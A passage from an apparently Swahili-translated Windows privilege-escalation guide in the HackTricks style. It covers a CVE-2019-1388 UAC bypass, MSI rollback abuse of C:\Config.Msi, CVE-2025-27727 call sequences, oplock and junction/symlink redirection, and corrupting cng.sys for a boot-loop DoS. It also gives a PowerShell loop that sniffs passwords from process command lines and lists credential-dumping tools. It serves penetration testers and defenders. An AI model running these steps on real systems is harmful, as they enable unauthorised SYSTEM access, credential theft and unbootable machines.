- Jiongeze kwenye `[TapiAdministrators]` katika `C:\Windows\TAPI\tsec.ini`, unganisha tena, kisha piga `GetUIDllName` ukiwa na njia yoyote ya DLL ili kutekeleza `TSPI_providerUIIdentify` kama `NETWORK SERVICE`.

Maelezo zaidi:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Mengineyo

### File Extensions zinazoweza kutekeleza vitu katika Windows

Angalia ukurasa **[https://filesec.io/](https://filesec.io/)**

### Matumizi mabaya ya Protocol handler / ShellExecute kupitia Markdown renderers

Viungo vya Markdown vinavyoweza kubofya na kutumwa kwa `ShellExecuteExW` vinaweza kuwasha URI handlers hatari (`file:`, `ms-appinstaller:` au scheme yoyote iliyosajiliwa) na kutekeleza faili zinazodhibitiwa na mshambuliaji kama mtumiaji wa sasa. Tazama:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Kufuatilia Command Lines kwa passwords**

Unapopata shell kama mtumiaji, kunaweza kuwa na scheduled tasks au processes nyingine zinazoendeshwa ambazo **hupitisha credentials kwenye command line**. Script iliyo hapa chini hukusanya command lines za processes kila baada ya sekunde mbili na kulinganisha hali ya sasa na hali iliyotangulia, kisha kutoa tofauti zozote.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Kuiba nywila kutoka kwa michakato

## Kutoka kwa mtumiaji asiye na ruhusa hadi NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ikiwa unaweza kufikia kiolesura cha picha (kupitia console au RDP) na UAC imewezeshwa, katika baadhi ya matoleo ya Microsoft Windows inawezekana kuendesha terminal au mchakato mwingine wowote kama "NT\AUTHORITY SYSTEM" kutoka kwa mtumiaji asiye na ruhusa.

Hii inaruhusu kuongeza ruhusa na kukwepa UAC kwa wakati mmoja kwa kutumia udhaifu huohuo. Zaidi ya hayo, hakuna haja ya kusakinisha chochote, na binary inayotumika wakati wa mchakato imesainiwa na kutolewa na Microsoft.

Baadhi ya mifumo iliyoathiriwa ni hii ifuatayo:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Ili ku-exploit udhaifu huu, ni muhimu kutekeleza hatua zifuatazo:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Una faili na taarifa zote zinazohitajika katika repository hii ya GitHub:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Kutoka Administrator Medium hadi High Integrity Level / UAC Bypass

Soma hili ili **ujifunze kuhusu Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Kisha **soma hili ili ujifunze kuhusu UAC na UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Kuelekeza Upload Directory Junctions kwenye Served Root

Programu inaweza kuunda subdirectory ya upload inayotabirika, kuandika ndani yake jina la faili lililotolewa na mtumiaji, kisha kuchakata faili hilo. Ikiwa mtumiaji mwenye privileges za chini anaweza kuondoa na kubadilisha subdirectory hiyo kuwa NTFS junction kabla ya uandishi wa upande wa server, uandishi unaweza kufuata junction hadi kwenye directory inayotumikiwa na web server. Script iliyowekwa hapo inaweza kuendeshwa kwa utambulisho wa web-service ikiwa server inaendesha aina hiyo ya faili. Hii ni mpaka wa arbitrary-write unaotegemea programu husika; kuwa na upload directory inayoweza kuandikwa au junction iliyopo pekee hakuthibitishi hilo.

Kagua jinsi path inavyoundwa na muda wa tukio hilo kwenye upload handler, ruhusa halisi za mtumiaji za kufuta/kuunda subdirectory hiyo, ACLs halisi za destination, iwapo writer hufuata reparse points, na iwapo web server huendesha faili katika destination hiyo. Thibitisha tofauti kati ya utambulisho wa process ya writer na wa web server. Orodha tuli inaweza kuonyesha ACLs za directory na metadata ya reparse, lakini haiwezi kubaini tabia ya handler au kubadilishwa kwa junction kutakakofanyika baadaye. Ikiwa execution inafanyika chini ya service account, kagua **process token halisi** kabla ya kuzingatia njia tofauti ya token-privilege.

## Kutoka Uwezo wa Kufuta/Kuhamisha/Kubadilisha Jina la Folder Yoyote hadi SYSTEM EoP

Mbinu iliyoelezwa [**katika chapisho hili la blogu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), pamoja na exploit code [**inayopatikana hapa**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Shambulio hili linatumia kipengele cha rollback cha Windows Installer kubadilisha faili halali na faili hasidi wakati wa mchakato wa uninstallation. Ili kufanya hivyo, mshambuliaji anahitaji kuunda **MSI installer hasidi** itakayotumika kuteka nyara folder ya `C:\Config.Msi`; baadaye Windows Installer itatumia folder hiyo kuhifadhi faili za rollback wakati wa kuondoa MSI packages nyingine, ambapo faili za rollback zitakuwa zimebadilishwa ili ziwe na malicious payload.

### Windows Installer COM cleanup-path injection (CVE-2025-27727)

Mteja mwenye privileges za chini anaweza kufikia huduma ya SYSTEM `msiexec.exe` kupitia COM object ya `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Reverse engineering ilibaini kuwa miito husika ya `IMsiServer` ni `MsiBeginTransactionW` katika vtable offset `0xA0`, `SetEEUIDirectoryAndFilter` katika `0xC8`, na `CleanupTempPackages` katika `0x50`. Majina na offsets hizi zilibainishwa kwa reverse engineering na zinaweza kutofautiana kati ya builds.<sup>[[41]](#references)</sup>

Kwa mtumiaji asiye administrator, `SetEEUIDirectoryAndFilter` huiga utambulisho wa caller tu wakati wa kufungua path iliyotolewa kwa `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS`, na `FILE_FLAG_OPEN_REPARSE_POINT`. Hii inathibitisha kuwa caller anaweza kufuta directory na huepusha kufuata reparse point, lakini **haihusishi** file object iliyokaguliwa na cleanup itakayofuata wala kuthibitisha kuwa Windows Installer ndiyo iliyoiumba.<sup>[[41]](#references)</sup>

Baada ya `MsiBeginTransactionW`, `SetEEUIDirectoryAndFilter` huratibu path hiyo kama folder bila kujali filter argument ya caller. Huduma huandika thamani yenye jina maalum ya `REG_DWORD` chini ya `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: jina la thamani ni path inayodhibitiwa na caller, na data `0x00000002` ni flag ya folder. Kisha `CleanupTempPackages(NULL, FALSE)` huingia moja kwa moja kwenye cleanup. Worker wake yenye privileges za juu huorodhesha thamani za registry na kupitisha entries za folder kwa `FDeleteFolder` ya kujirudia bila kukagua asili ya path. Ikiwa uondoaji wa kawaida hautafaulu, code pia huita `LockdownPath`, huondoa file attributes, kisha hujaribu tena.<sup>[[41]](#references)</sup>

Mfuatano wa chini kabisa wa miito uliopatikana kwenye `msi.dll` ni:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Primitive inayofaa ni kutumia tena path badala ya kuelekeza kwa junction. Sajili `C:\Config.Msi` iliyoundwa na mshambulizi, iondoe, kisha uruhusu Windows Installer iunde tena pathname hiyo hiyo ikiwa na rollback data iliyolindwa. Cleanup huamini jina la zamani la `TempPackages` na kufuta directory mpya kama SYSTEM. Hii hupita boundary iliyokusudiwa na mitigation za `FILE_FLAG_OPEN_REPARSE_POINT` na redirection-trust kwa sababu reparse point haihitajiki.<sup>[[41]](#references)</sup>

Primitive hii ya kufuta inafaa katika rollback chain iliyo hapa chini: hifadhi rekodi tofauti ya `Installer\Folders`, futa `C:\Config.Msi` iliyolindwa, iunde tena ikiwa na NULL DACL, na uhifadhi handle uliyopewa `WRITE_DAC` kabla installer haijaimarisha DACL. Handle iliyofunguliwa awali inaweza kurejesha DACL inayoruhusu ufikiaji kwa kutumia `NtSetSecurityObject`, kisha `.rbs` iliyozalishwa inaweza kubadilishwa kabla rollback haijaendelea.<sup>[[41]](#references)</sup>

Microsoft ilirekebisha path hii kwa kuzuia `CMsiTransaction::SetEEUIDirectoryAndFilter` kuita `ScheduleFileOrFolderDelete` wakati feature gate mpya imewezeshwa. COM call bado inaweza kurudisha success, lakini haiweki tena path inayodhibitiwa na mshambulizi katika `TempPackages`. Tumia Windows security updates za Aprili 2025 badala ya kuchukulia return ya method yenye mafanikio kuwa kipimo cha patch.<sup>[[41]](#references)[[42]](#references)</sup>

Mbinu hii kwa muhtasari ni kama ifuatavyo:

1. **Hatua ya 1 – Kujiandaa kwa Hijack (acha `C:\Config.Msi` ikiwa tupu)**

- Hatua ya 1: Install MSI
    - Unda `.msi` inayosakinisha faili isiyo na madhara (kwa mfano, `dummy.txt`) katika folder inayoweza kuandikika (`TARGETDIR`).
    - Weka alama kuwa installer ni **"UAC Compliant"**, ili **mtumiaji asiye admin** aweze kuiendesha.
    - Acha **handle** ya faili ikiwa wazi baada ya install.

- Hatua ya 2: Anza Uninstall
    - Fanya uninstall ya `.msi` hiyo hiyo.
    - Mchakato wa uninstall huanza kuhamisha faili hadi `C:\Config.Msi` na kuzipa majina mapya ya `.rbf` (rollback backups).
    - **Poll handle ya faili iliyo wazi** ukitumia `GetFinalPathNameByHandle` ili kutambua faili inapokuwa `C:\Config.Msi\<random>.rbf`.

- Hatua ya 3: Custom Syncing
    - `.msi` inajumuisha **custom uninstall action (`SyncOnRbfWritten`)** ambayo:
        - Huashiria pale `.rbf` inapoandikwa.
        - Kisha **husubiri** event nyingine kabla ya kuendelea na uninstall.

- Hatua ya 4: Zuia Kufutwa kwa `.rbf`
    - Ikishaashiriwa, **fungua faili ya `.rbf`** bila `FILE_SHARE_DELETE` — hii **huzuia isifutwe**.
    - Kisha **tuma ishara ya kurudisha** ili uninstall ikamilike.
    - Windows Installer inashindwa kufuta `.rbf`, na kwa kuwa haiwezi kufuta maudhui yote, **`C:\Config.Msi` haiondolewi**.

- Hatua ya 5: Futa `.rbf` Mwenyewe
    - Wewe (mshambulizi) futa faili ya `.rbf` mwenyewe.
    - Sasa **`C:\Config.Msi` ni tupu**, tayari kufanyiwa hijack.

> Kwa wakati huu, **anzisha vulnerability ya kufuta folder kiholela katika kiwango cha SYSTEM** ili kufuta `C:\Config.Msi`.

2. **Hatua ya 2 – Kubadilisha Rollback Scripts kwa Zenye Madhara**

- Hatua ya 6: Unda Tena `C:\Config.Msi` ikiwa na ACL Dhaifu
    - Unda tena folder ya `C:\Config.Msi` mwenyewe.
    - Weka **DACL dhaifu** (kwa mfano, Everyone:F), na **acha handle wazi** yenye `WRITE_DAC`.

- Hatua ya 7: Endesha Install Nyingine
    - Install `.msi` tena, ikiwa na:
        - `TARGETDIR`: Mahali panapoweza kuandikika.
        - `ERROROUT`: Variable inayosababisha hitilafu ya lazima.
    - Install hii itatumika kuanzisha **rollback** tena, ambayo husoma `.rbs` na `.rbf`.

- Hatua ya 8: Fuatilia `.rbs`
    - Tumia `ReadDirectoryChangesW` kufuatilia `C:\Config.Msi` hadi `.rbs` mpya ionekane.
    - Rekodi jina lake la faili.

- Hatua ya 9: Sawazisha Kabla ya Rollback
    - `.msi` ina **custom install action (`SyncBeforeRollback`)** ambayo:
        - Huashiria event wakati `.rbs` inapoundwa.
        - Kisha **husubiri** kabla ya kuendelea.

- Hatua ya 10: Weka Tena ACL Dhaifu
    - Baada ya kupokea event ya `.rbs created`:
        - Windows Installer **huweka tena ACL imara** kwenye `C:\Config.Msi`.
        - Lakini kwa kuwa bado una handle yenye `WRITE_DAC`, unaweza **kuweka tena ACL dhaifu**.

> ACLs **hutekelezwa tu wakati handle inafunguliwa**, kwa hiyo bado unaweza kuandika kwenye folder.

- Hatua ya 11: Weka `.rbs` na `.rbf` Bandia
    - Andika juu ya faili ya `.rbs` script **bandia ya rollback** inayoelekeza Windows:
        - Kurejesha faili yako ya `.rbf` (DLL yenye madhara) kwenye **mahali penye privileged access** (kwa mfano, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Weka `.rbf` yako bandia yenye **DLL payload yenye madhara ya kiwango cha SYSTEM**.

- Hatua ya 12: Anzisha Rollback
    - Tuma ishara ya sync event ili installer iendelee.
    - **Custom action ya type 19 (`ErrorOut`)** imesanidiwa **kufanya install ishindwe kimakusudi** katika hatua inayojulikana.
    - Hii husababisha **rollback kuanza**.

- Hatua ya 13: SYSTEM Husakinisha DLL Yako
    - Windows Installer:
        - Husoma `.rbs` yako yenye madhara.
        - Hunakili DLL yako ya `.rbf` hadi mahali lengwa.
    - Sasa una **DLL yako yenye madhara katika path inayopakiwa na SYSTEM**.

- Hatua ya Mwisho: Tekeleza SYSTEM Code
    - Endesha **binary inayoaminika inayopata elevation kiotomatiki** (kwa mfano, `osk.exe`) inayopakia DLL uliyo-hijack.
    - **Boom**: Code yako inatekelezwa **kama SYSTEM**.


### Kutoka Arbitrary File Delete/Move/Rename hadi SYSTEM EoP

Mbinu kuu ya MSI rollback (iliyotangulia) hudhani unaweza kufuta **folder nzima** (kwa mfano, `C:\Config.Msi`). Lakini vipi ikiwa vulnerability yako inaruhusu **kufuta faili kiholela** tu?

Unaweza kutumia **mambo ya ndani ya NTFS**: kila folder ina alternate data stream iliyofichwa inayoitwa:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Stream hii huhifadhi **metadata ya index** ya folda.

Kwa hiyo, ukifuta stream ya `::$INDEX_ALLOCATION` ya folda, NTFS **huondoa folda nzima** kwenye mfumo wa faili.

Unaweza kufanya hivi kwa kutumia API za kawaida za kufuta faili kama:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Ingawa unaita API ya kufuta *file*, **inafuta folder yenyewe**.

### Kutoka Kufuta Yaliyomo kwenye Folder hadi SYSTEM EoP
Vipi ikiwa primitive yako hairuhusu kufuta files/folders zozote, lakini **inaruhusu kufuta *yaliyomo* kwenye folder inayodhibitiwa na mshambuliaji**?

1. Hatua ya 1: Sanidi folder na file ya chambo
- Unda: `C:\temp\folder1`
- Ndani yake: `C:\temp\folder1\file1.txt`

2. Hatua ya 2: Weka **oplock** kwenye `file1.txt`
- Oplock **husitisha utekelezaji** wakati mchakato wenye upendeleo mkubwa unapojaribu kufuta `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Hatua ya 3: Anzisha mchakato wa SYSTEM (kwa mfano, `SilentCleanup`)
- Mchakato huu huchanganua folda (kwa mfano, `%TEMP%`) na kujaribu kufuta yaliyomo.
- Unapofikia `file1.txt`, **oplock huwashwa** na kukabidhi udhibiti kwa callback yako.

4. Hatua ya 4: Ndani ya callback ya oplock – elekeza upya ufutaji

- Chaguo A: Hamisha `file1.txt` mahali pengine
    - Hii huacha `folder1` tupu bila kuvunja oplock.
    - Usifute `file1.txt` moja kwa moja — kufanya hivyo kutatoa oplock kabla ya wakati.

- Chaguo B: Geuza `folder1` kuwa **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Chaguo C: Unda **symlink** ndani ya `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Hii inalenga internal stream ya NTFS inayohifadhi metadata ya folda — kuifuta kunafuta folda.

5. Hatua ya 5: Achia oplock
- Mchakato wa SYSTEM unaendelea na kujaribu kufuta `file1.txt`.
- Lakini sasa, kutokana na junction + symlink, kwa kweli unafuta:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Matokeo**: `C:\Config.Msi` imefutwa na SYSTEM.

### Kutoka kwa Uundaji wa Folda Yoyote Hadi DoS ya Kudumu

Tumia primitive inayokuruhusu **kuunda folda yoyote kama SYSTEM/admin** — hata kama **huwezi kuandika faili** au **kuweka ruhusa dhaifu**.

Unda **folda** (si faili) yenye jina la **Windows driver muhimu**, kwa mfano:
```
C:\Windows\System32\cng.sys
```

- Njia hii kwa kawaida inalingana na kernel-mode driver `cng.sys`.
- Ukiitengeneza mapema kama folda, Windows hushindwa kupakia driver halisi wakati wa boot.
- Kisha, Windows hujaribu kupakia `cng.sys` wakati wa boot.
- Hukuta folda hiyo, **hushindwa kutatua driver halisi**, na **hu-crash au kusimamisha boot**.
- **Hakuna fallback** wala **recovery** bila uingiliaji wa nje (kwa mfano, boot repair au ufikiaji wa diski).

### Kutoka kwenye njia za log/backup zenye privileged access + OM symlinks hadi overwrite ya faili yoyote / boot DoS

Wakati **huduma yenye privileged access** inapoandika logs/exports kwenye njia iliyosomwa kutoka kwenye **config inayoweza kuandikwa**, elekeza upya njia hiyo kwa **Object Manager symlinks + NTFS mount points** ili kubadilisha uandishi wa privileged kuwa overwrite ya faili yoyote (hata **bila SeCreateSymbolicLinkPrivilege**).<sup>[[15]](#references)</sup>

**Mahitaji**
- Config inayohifadhi njia lengwa iweze kuandikwa na mshambuliaji (kwa mfano, `%ProgramData%\...\.ini`).
- Uwezo wa kuunda mount point kwenda `\RPC Control` na OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Operesheni yenye privileged access inayoandika kwenye njia hiyo (log, export, report).

**Mfano wa mfuatano**
1. Soma config ili kupata tena mahali pa log penye privileged access, kwa mfano, `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` ndani ya `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Elekeza upya njia hiyo bila admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Subiri component yenye privileged iandike log (kwa mfano, admin aanzishe "send test SMS"). Sasa maandishi yataingia kwenye `C:\Windows\System32\cng.sys`.
4. Kagua target iliyoandikwa juu (kwa hex/PE parser) ili kuthibitisha uharibifu; kuwasha upya hulazimisha Windows kupakia driver iliyoharibiwa → **boot loop DoS**. Hii pia inatumika kwa faili yoyote iliyolindwa ambayo service yenye privileged itafungua kwa ajili ya kuandika.

> `cng.sys` kwa kawaida hupakiwa kutoka `C:\Windows\System32\drivers\cng.sys`, lakini ikiwa nakala ipo kwenye `C:\Windows\System32\cng.sys`, inaweza kujaribiwa kwanza, na kuifanya kuwa mahali pa kuaminika pa DoS kwa data iliyoharibika.



## **Kutoka High Integrity hadi System**

### **Huduma mpya**

Ikiwa tayari unaendesha mchakato wa High Integrity, **njia ya kufikia SYSTEM** inaweza kuwa rahisi: **unda na utekeleze service mpya**.

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Unapounda binary ya service, hakikisha ni service halali au binary inatekeleza vitendo vinavyohitajika haraka, kwa kuwa itasitishwa baada ya sekunde 20 ikiwa si service halali.

### AlwaysInstallElevated

Kutoka kwenye mchakato wa High Integrity unaweza kujaribu **kuwezesha maingizo ya registry ya AlwaysInstallElevated** na **kusakinisha** reverse shell kwa kutumia kifungashio cha _**.msi**_.\
[Maelezo zaidi kuhusu funguo za registry zinazohusika na jinsi ya kusakinisha kifurushi cha _.msi_ hapa.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Unaweza** [**kupata code hapa**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Ikiwa una privileges hizo za tokeni (huenda utazipata katika mchakato ambao tayari una High Integrity), utaweza **kufungua karibu mchakato wowote** (isipokuwa michakato iliyolindwa) kwa kutumia privilege ya SeDebug, **kunakili tokeni** ya mchakato huo, na kuunda **mchakato wowote kwa kutumia tokeni hiyo**.\
Kwa kawaida, mbinu hii **huchagua mchakato wowote unaoendeshwa kama SYSTEM wenye privileges zote za tokeni** (_ndiyo, unaweza kupata michakato ya SYSTEM isiyo na privileges zote za tokeni_).\
**Unaweza kupata** [**mfano wa code inayotekeleza mbinu iliyopendekezwa hapa**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Mbinu hii hutumiwa na meterpreter ili kuongeza privilege kupitia `getsystem`. Mbinu hii inahusisha **kuunda pipe kisha kuunda/kutumia vibaya service ili kuandika kwenye pipe hiyo**. Kisha, **server** iliyounda pipe kwa kutumia privilege ya **`SeImpersonate`** itaweza **kuiga tokeni** ya client ya pipe (service), na kupata privileges za SYSTEM.\
Ukitaka [**kujifunza zaidi kuhusu name pipes, soma hili**](#named-pipe-client-impersonation).\
Ukitaka kusoma mfano wa [**jinsi ya kutoka High Integrity hadi System kwa kutumia name pipes, soma hili**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ukiweza **kuteka nyara dll** inayopakiwa na **mchakato** unaoendeshwa kama **SYSTEM**, utaweza kutekeleza code yoyote kwa ruhusa hizo. Kwa hiyo, Dll Hijacking pia inafaa kwa aina hii ya privilege escalation; na, zaidi ya hayo, ni **rahisi zaidi kuitekeleza kutoka kwenye mchakato wenye High Integrity**, kwa kuwa utakuwa na **ruhusa za kuandika** kwenye folda zinazotumiwa kupakia dlls.\
**Unaweza** [**kujifunza zaidi kuhusu Dll hijacking hapa**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Soma:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Msaada zaidi

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Zana muhimu

**Zana bora ya kutafuta njia za kuongeza privilege za ndani za Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Hukagua usanidi usio sahihi na faili nyeti (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Imegunduliwa.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Hukagua baadhi ya usanidi usio sahihi unaowezekana na kukusanya taarifa (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Hukagua usanidi usio sahihi**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Hutoa taarifa za session zilizohifadhiwa za PuTTY, WinSCP, SuperPuTTY, FileZilla na RDP. Tumia -Thorough kwenye mashine ya ndani.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Hutoa credentials kutoka Credential Manager. Imegunduliwa.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Hujaribu passwords zilizokusanywa kwenye domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ni zana ya PowerShell ya ku-spoof ADIDNS/LLMNR/mDNS na kufanya man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Uhesabuji wa msingi wa Windows kwa privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Hutafuta udhaifu unaojulikana wa privesc (IMEPITWA NA WAKATI; tumia Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Ukaguzi wa ndani **(Unahitaji haki za Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Hutafuta udhaifu unaojulikana wa privesc (inahitaji ku-compiliwa kwa kutumia VisualStudio) ([**iliyocompiliwa awali**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Huchunguza host kutafuta usanidi usio sahihi (ni zaidi ya zana ya kukusanya taarifa kuliko zana ya privesc) (inahitaji ku-compiliwa) **(**[**iliyocompiliwa awali**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Hutoa credentials kutoka kwenye programu nyingi (exe iliyocompiliwa awali inapatikana kwenye github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Uhamishaji wa PowerUp kwenda C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Hukagua usanidi usio sahihi (executable iliyocompiliwa awali inapatikana kwenye github). Haipendekezwi. Haifanyi kazi vizuri kwenye Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Hukagua usanidi usio sahihi unaowezekana (exe ya python). Haipendekezwi. Haifanyi kazi vizuri kwenye Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Zana iliyoundwa kwa kutegemea chapisho hili (haihitaji accesschk ili kufanya kazi vizuri, lakini inaweza kuitumia).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Husoma matokeo ya **systeminfo** na kupendekeza exploits zinazofanya kazi (python ya ndani)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Husoma matokeo ya **systeminfo** na kupendekeza exploits zinazofanya kazi (Python ya ndani)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Lazima ucompile mradi kwa kutumia toleo sahihi la .NET ([tazama hili](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Ili kuona toleo la .NET lililosakinishwa kwenye host ya mwathiriwa, unaweza kufanya hivi:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Misingi ya Windows Privilege Escalation](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Kuongeza privileges kwa kutumia vibaya ruhusa dhaifu za folda](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - cheatsheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Warsha ya Local Privilege Escalation ya Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Mashambulizi ya Windows: AT ndiyo mtindo mpya (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - Mwongozo Kamili wa OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Mwongozo wa Windows Privilege Escalation](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Orodha hakiki ya Windows-Privilege-Escalation](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Mbinu za Windows Privilege Escalation kwa Pentesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: Hadaa kupitia macro ya Word VBA na SMTP → kusimbua credentials za hMailServer → Veeam CVE-2023-27532 hadi SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: leak ya format-string + stack BOF → VirtualAlloc ROP (RCE) na wizi wa kernel token](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Kumfuatilia Silver Fox: Mchezo wa paka na panya katika vivuli vya Kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Athari ya mfumo wa faili yenye privileges katika mfumo wa SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
